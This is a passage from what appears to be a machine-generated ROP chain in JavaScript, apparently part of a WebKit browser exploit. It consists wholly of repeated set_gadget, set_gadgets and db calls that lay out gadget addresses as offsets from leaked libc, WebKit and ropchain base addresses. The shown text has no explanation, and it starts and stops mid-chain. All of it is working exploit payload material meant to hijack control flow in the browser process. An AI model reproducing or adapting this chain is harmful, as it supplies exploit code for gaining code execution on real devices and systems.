db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272992, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273064, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273136, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273208, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273280, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273352, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273424, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273496, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273568, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273640, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273712, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273784, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273856, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273928, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274000, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274072, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274144, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274216, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274288, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274360, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274432, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274504, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274576, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274648, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274720, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274792, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274864, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274936, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+275032, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+50775, 
libc_base+793877, 
ropchain+275104, 
webkit_base+7438103, 
libc_base+788575 
]);
db([256, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+275200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+275312, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+246552, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+275400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967036, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+275464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+759626, 
libc_base+793877 
]);
db([4294967028, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+275568, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+275624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+275688, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967028, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+275776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+275792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+275944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+275976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+275928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+275960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+276048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276064, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+276160, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+276144, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+276240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+276392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276408, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+276376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+276576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+276560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+276696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+276728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+276856, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+276848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+276872, 
ropchain+276888, 
libc_base+811575, 
ropchain+276904, 
libc_base+811575, 
ropchain+284432, 
libc_base+793877, 
ropchain+276960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([40, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+277048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+277064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+277208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+277176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+277192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+277304, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+277384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+277440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+277680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+277696, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+277784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+277840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+277912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+277968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+278072, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([32, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+278160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+278328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+278360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+278312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278344, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+278456, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+278440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+278552, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967028, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+278640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+278808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+278840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+278792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+278944, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+278928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+279000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+279144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+279160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+279128, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+279256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+279240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+279352, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+279432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+279488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([176, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+279728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+279744, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+279832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+279888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+279960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+280016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+280120, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967036, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+280208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+280224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+280376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+280408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+280360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+280392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+280504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+280488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+280600, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([51, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+280800, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+280888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+280904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+281040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+281056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+281024, 
webkit_base+7438103, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+281144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+281304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+281272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+281376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+281432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+281528, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967028, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+281616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+281784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+281816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+281768, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+281976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+281944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+281928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+282048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282064, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+282152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+282208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+282328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+282344, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+282512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+282496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+282528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+282616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+282728, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+282712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
